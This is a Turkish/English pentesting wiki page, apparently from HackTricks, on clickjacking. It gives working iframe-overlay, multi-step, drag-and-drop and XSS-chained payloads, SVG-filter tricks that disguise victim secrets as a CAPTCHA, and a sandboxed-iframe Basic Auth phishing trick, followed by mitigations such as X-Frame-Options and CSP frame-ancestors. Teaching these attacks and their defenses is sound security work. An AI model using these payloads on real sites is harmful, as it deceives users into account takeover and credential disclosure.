# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking Nedir

Bir clickjacking saldırısında, bir **kullanıcı** bir web sayfasındaki ya **görünmez** ya da farklı bir **öğe** gibi kamufle edilmiş bir **öğeye tıklamaya** **kandırılır**. Bu manipülasyon, kullanıcının istemediği sonuçlara yol açabilir; örneğin malware indirilmesi, kötü amaçlı web sayfalarına yönlendirme, kimlik bilgileri veya hassas bilgilerin verilmesi, para transferleri veya çevrimiçi ürün satın alımları.

### Formları önceden doldurma hilesi

Bazen bir sayfa yüklenirken **GET parametreleri kullanarak bir formun alan değerlerini doldurmak** mümkün olabilir. Bir saldırgan bu davranışı kötüye kullanarak formu rastgele verilerle doldurup clickjacking payload'unu göndererek kullanıcının Submit düğmesine basmasını sağlayabilir.

### Drag\&Drop ile form doldurma

Eğer kullanıcıdan bir **form doldurmasını** istiyorsanız ama ona doğrudan belirli bilgileri (ör. bildiğiniz e-posta veya belirli bir şifre) yazmasını söylemek istemiyorsanız, kontrolünüzdeki verileri yazacak bir şeyi ona **Drag\&Drop** etmesini isteyebilirsiniz; [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/) örneğinde olduğu gibi.

### Temel Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Çok Aşamalı Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
Örnek:\
You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters.\
Bir saldırgan, ilgili sayfaya bir **Clickjacking** saldırısı hazırlayıp **formu** **XSS payload** ile önceden doldurarak kullanıcıyı formu **Gönder**meye kandırabilir. Böylece **form gönderildiğinde** ve değerler değiştirildiğinde, **kullanıcı XSS'i çalıştırır**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.
İlk olarak [bu yazıda açıklanmış](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), bu teknik kurbanı belirli bir konuma yerleştirilmiş özel bir sayfadaki bir butona çift tıklamaya ikna eder ve mousedown ile onclick event'leri arasındaki zamanlama farkını kullanarak çift tıklama sırasında kurban sayfasını yükler; böylece **kurban aslında kurban sayfasındaki meşru bir butona tıklar**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.
> 
> Bu teknik, kullanıcının kurban sayfasında tek bir yere tıklamasını sağlayarak clickjacking'e karşı tüm korumaları atlatmaya izin verir. Bu yüzden saldırganın yalnızca tek bir tıklamayla gerçekleştirilebilecek **hassas işlemleri** (ör. OAuth izinlerini kabul eden prompt'lar) bulması gerekir.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM. A simple Liquid-Glass style filter looks like:
Modern Chromium/WebKit/Gecko derlemeleri, CSS `filter:url(#id)`'in cross-origin iframe'lere uygulanmasına izin veriyor. Iframe'in rasterize edilmiş pikselleri SVG filter grafiğine `SourceGraphic` olarak açığa çıkarılıyor; bu yüzden `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology` vb. primitifler, saldırgan DOM'a asla dokunmasa bile kullanıcı görmeden önce kurbanın UI'sını keyfi olarak çarpıtabilir. Basit bir Liquid-Glass tarzı filtre şöyle görünür:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Yararlı ilkel işlemler: `feImage` saldırgan bitmap'lerini yükler (ör. örn. overlays, displacement map'ler); `feFlood` sabit renkli matte'ler oluşturur; `feOffset/feGaussianBlur` vurguları inceltir/iyileştirir; `feDisplacementMap` metni kırar/deforme eder; `feComposite operator="arithmetic"` kanal başına rastgele matematik uygular (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), bu kontrast artırma, maskeleme ve AND/OR işlemleri için yeterlidir; `feTile` piksel örneklerini kırpar ve çoğaltır; `feMorphology` konturları büyütür/küçültür; `feColorMatrix` luma'yı alfa'ya taşıyarak hassas maskeler oluşturur.

#### Gizli bilgileri CAPTCHA-style istemlere çarpıtma

Eğer frame'lenebilir bir endpoint sırları (tokens, reset kodları, API anahtarları) render ediyorsa, saldırgan bunları CAPTCHA'ya benzeyecek şekilde çarpıtıp elle yazdırmaya zorlayabilir:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Bozulmuş pikseller, kullanıcıyı saldırgan-kontrollü `<input>` içindeki captcha'yı “çözdüğünü” zannettirir; burada `pattern` gerçek kurban sırrını dayatır.

#### Kurban girdilerini yeniden bağlama

Filtreler, kullanıcı tuş vuruşlarını korurken placeholder/validation metnini cerrahi olarak silebilir. Bir iş akışı:

1. `feComposite operator="arithmetic" k2≈4` parlaklığı artırır, böylece gri yardımcı metin beyaza doyar.
2. `feTile` çalışma alanını input dikdörtgeniyle sınırlar.
3. `feMorphology operator="erode"` kurban tarafından yazılan koyu glifleri kalınlaştırır ve bunları `result="thick"` ile saklar.
4. `feFlood` beyaz bir zemin oluşturur, `feBlend mode="difference"` ile `thick`'le karıştırır ve ikinci bir `feComposite k2≈100` bunu çarpıcı bir luma matına dönüştürür.
5. `feColorMatrix` bu luma'yı alfa'ya taşır ve `feComposite in="SourceGraphic" operator="in"` yalnızca kullanıcı tarafından girilen glifleri tutar.
6. Başka bir `feBlend in2="white"` artı ince bir kırpma temiz bir metin kutusu verir; bunun ardından saldırgan kendi HTML etiketlerini (ör. “E-posta adresinizi girin”) üstüne bindirirken gizli iframe hâlâ kurban origin'inin parola politikasını uygular.

Safari `feTile` ile zorlanır; aynı etki, WebKit-only payload'lar için `feFlood` + `feColorMatrix` + `feComposite`'den oluşturulan uzamsal mattelerle yeniden üretilebilir.

#### Piksel probları, mantık ve durum makineleri

`feTile` ile 2–4 px'lik bir bölgeyi kırparak ve bunu viewport'un `100%`'üne döşeyerek, saldırgan örneklenen rengi eşikleyerek boolean bir maske oluşturulabilecek tam çerçeve bir dokuya dönüştürür:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
For arbitrary colors, a `feFlood` reference (e.g., `#0B57D0`) plus `feBlend mode="difference"` and another arithmetic composite (`k2≈100`, `k4` as tolerance) outputs white only when the sampled pixel matches the target shade. Feeding these masks into `feComposite` with tuned `k1..k4` yields logic gates: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Chaining gates makes a full adder inside the filter graph, proving the pipeline is functionally complete.

Bu nedenle saldırganlar JavaScript olmadan UI durumunu okuyabilirler. Modal bir iş akışından örnek booleanlar:

- **D** (dialog visible): karartılmış bir köşeyi prob et ve beyaza karşı test et.
- **L** (dialog loaded): buton hazır olduğunda göründüğü koordinatları prob et.
- **C** (checkbox checked): checkbox pikselini aktif mavi `#0B57D0` ile karşılaştır.
- **R** (red success/failure banner): banner dikdörtgeni içinde `feMorphology` ve kırmızı eşik değerleri kullan.

Her tespit edilen durum `feImage xlink:href="data:..."` ile gömülmüş farklı bir kaplama bitmap'ini gate'ler. Bu bitmap'leri `D`, `L`, `C`, `R` ile maskelemek, kaplamaları gerçek dialog ile senkronize tutar ve kurbanı DOM'u açmadan çok adımlı iş akışları (şifre sıfırlama, onaylar, yıkıcı onaylamalar) boyunca yönlendirir.

### Sandboxed iframe Basic Auth dialog (no allow-popups)

A sandboxed iframe without `allow-popups` can still surface a browser-controlled **HTTP Basic Authentication modal** when a load returns `401` with `WWW-Authenticate`. The dialog is spawned by the browser’s networking/auth layer (not JS `alert/prompt/confirm`), so popup restrictions in the sandbox do **not** suppress it. If you can script the iframe (e.g., `sandbox="allow-scripts"`) you can navigate it to any endpoint issuing a Basic Auth challenge:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Once the response arrives, the browser prompts for credentials even though popups are disallowed. Framing a trusted origin with this trick enables UI redress/phishing: unexpected modal prompts inside a "sandboxed" widget can confuse users or trigger password managers to offer stored credentials.

### Browser extensions: DOM-based autofill clickjacking

Aside from iframing victim pages, attackers can target browser extension UI elements that are injected into the page. Password managers render autofill dropdowns near focused inputs; by focusing an attacker-controlled field and hiding/occluding the extension’s dropdown (opacity/overlay/top-layer tricks), a coerced user click can select a stored item and fill sensitive data into attacker-controlled inputs. This variant requires no iframe exposure and works entirely via DOM/CSS manipulation.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Scripts executed on the client side can perform actions to prevent Clickjacking:

- Ensuring the application window is the main or top window.
- Making all frames visible.
- Preventing clicks on invisible frames.
- Detecting and alerting users to potential Clickjacking attempts.

However, these frame-busting scripts may be circumvented:

- **Browsers' Security Settings:** Some browsers might block these scripts based on their security settings or lack of JavaScript support.
- **HTML5 iframe `sandbox` Attribute:** An attacker can neutralize frame buster scripts by setting the `sandbox` attribute with `allow-forms` or `allow-scripts` values without `allow-top-navigation`. This prevents the iframe from verifying if it is the top window, e.g.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms` ve `allow-scripts` değerleri iframe içinde eylemlere izin verirken üst düzey navigasyonu devre dışı bırakır. Hedeflenen sitenin amaçlanan işlevselliğini sağlamak için, saldırı türüne bağlı olarak `allow-same-origin` ve `allow-modals` gibi ek izinler gerekebilir. Hangi izinlerin verilmesi gerektiği konusunda tarayıcı konsolundaki mesajlar yol gösterici olabilir.

### Server-Side Defenses

#### X-Frame-Options

**`X-Frame-Options` HTTP response header** tarayıcılara bir sayfanın `<frame>` veya `<iframe>` içinde render edilmesinin meşru olup olmadığı bilgisini verir ve Clickjacking'i önlemeye yardımcı olur:

- `X-Frame-Options: deny` - Hiçbir domain içeriği çerçeveleyemez.
- `X-Frame-Options: sameorigin` - Sadece aynı site içeriği çerçeveleyebilir.
- `X-Frame-Options: allow-from https://trusted.com` - Sadece belirtilen 'uri' sayfayı çerçeveleyebilir.
- Sınırlamaları not edin: tarayıcı bu yönergeyi desteklemiyorsa çalışmayabilir. Bazı tarayıcılar CSP frame-ancestors yönergesini tercih eder.

#### Content Security Policy (CSP) frame-ancestors directive

**`frame-ancestors` directive in CSP** Clickjacking koruması için tavsiye edilen yöntemdir:

- `frame-ancestors 'none'` - `X-Frame-Options: deny` ile benzer.
- `frame-ancestors 'self'` - `X-Frame-Options: sameorigin` ile benzer.
- `frame-ancestors trusted.com` - `X-Frame-Options: allow-from` ile benzer.

Örneğin, aşağıdaki CSP sadece aynı domainden framing'e izin verir:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)**, tarayıcının hangi kaynaklara içerik yüklemesine izin verileceğini belirleyerek Clickjacking ve diğer kod enjeksiyonu saldırılarını önlemeye yardımcı olan bir güvenlik önlemidir.

#### `frame-src` Directive

- Çerçeveler için geçerli kaynakları tanımlar.
- `default-src` yönergesinden daha spesiftir.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Bu politika aynı origin (self) ve https://trusted-website.com'dan gelen frame'lere izin verir.

#### `child-src` Yönergesi

- CSP seviye 2'de web workers ve frames için geçerli kaynakları belirlemek amacıyla tanıtıldı.
- frame-src ve worker-src için bir fallback görevi görür.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Bu politika aynı kaynaktan (self) ve https://trusted-website.com adresinden gelen frame'lere ve worker'lara izin verir.

**Kullanım Notları:**

- Kullanımdan kaldırılma: child-src, frame-src ve worker-src lehine kademeli olarak kaldırılıyor.
- Yedek Davranışı: Eğer frame-src yoksa, child-src frame'ler için yedek olarak kullanılır. Her ikisi de yoksa default-src kullanılır.
- Sıkı Kaynak Tanımı: Sömürüleri önlemek için yönergelere yalnızca güvenilir kaynakları dahil edin.

#### JavaScript Frame-Breaking Scripts

Tamamen kusursuz olmasa da, JavaScript tabanlı frame-busting scripts bir web sayfasının frame içinde gösterilmesini engellemek için kullanılabilir. Örnek:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens Kullanımı

- **Token Doğrulama:** web uygulamalarında anti-CSRF tokens kullanın; böylece durum değiştiren isteklerin kullanıcının kasıtlı olarak yaptığı ve Clickjacked bir sayfa aracılığıyla yapılmadığından emin olursunuz.

## Referanslar

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
